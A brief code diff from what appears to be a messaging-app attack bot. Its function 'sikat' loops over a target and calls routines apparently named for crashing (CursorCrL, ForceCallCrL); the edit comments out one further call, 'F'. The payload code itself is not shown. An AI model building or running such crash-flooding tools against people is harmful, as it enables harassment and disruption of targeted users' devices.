@@ -1132,7 +1132,7 @@ async function sikat(sock, target) {
         //await AB2(sock, target, true)
         await CursorCrL(sock, target)
         await ForceCallCrL(sock, target)
-        await F(sock, target)
+        //await F(sock, target)
         console.log(`${i} sikat Packet To ${target}`)
     }
 }
